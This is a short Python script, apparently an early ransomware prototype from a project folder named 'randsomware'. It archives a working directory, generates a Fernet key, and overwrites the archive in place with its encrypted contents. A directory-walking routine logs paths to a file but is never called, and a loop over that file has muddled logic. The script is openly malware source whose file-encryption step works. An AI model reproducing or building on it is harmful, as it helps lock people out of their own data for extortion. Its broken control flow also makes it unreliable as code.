import os
import time
import shutil
from cryptography.fernet import Fernet
from pathlib import Path

keyfile = 'important.key'
File_Format = 'zip'
working_dir = os.getcwd()
home = str(Path.home())
path_file = working_dir+"\\paths.txt"


def dir_search():
    os.chdir('D:\\Users\\Daniel\\Desktop\\Securing Information\\Python\\')
    for dirpath, dirs, files in os.walk("."):
        with open(path_file, 'a') as p1:
            paths = dirpath
            p1.writelines(paths+'\n')
            p1.close()


Folder_Path = 'D:\\Users\\Daniel\\Desktop\\Securing Information\\Python\\my_projects\\randsomware\\.idea'
Folder = os.path.basename(os.path.normpath(Folder_Path))
File = Folder + '.' + File_Format


def zipping(output, kind, folder):
    shutil.make_archive(output, kind, folder)
    print("The folder " + Folder + " was successfully zipped into " + File + "\n")


with open(path_file, 'r+') as file3:
    for line in file3:
        folder1 = file3.readline()
        folder2 = os.path.basename(os.path.normpath(folder1))
        folder3 = folder2
        zipping(Folder, File_Format, working_dir)
        print()
        time.sleep(2)


def encrypting(filename):
    print('Working on key file...\n')
    key = Fernet.generate_key()
    key1 = open(keyfile, "wb")
    key1.write(key)
    key1.close()
    print("Key was successfully made as " + keyfile + "\nMake sure you keep it safe !\n")

    with open(keyfile, "rb") as f1:
        key = f1.read()
    print('Key was successfully loaded.')
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
        print('File was successfully rade.\n')
    file_enc = f.encrypt(file_data)
    print('File was successfully encrypted')
    with open(filename, 'wb') as file:
        file.write(file_enc)
        print('Encrypted file was successfully created')


print('hi')
encrypting(File)


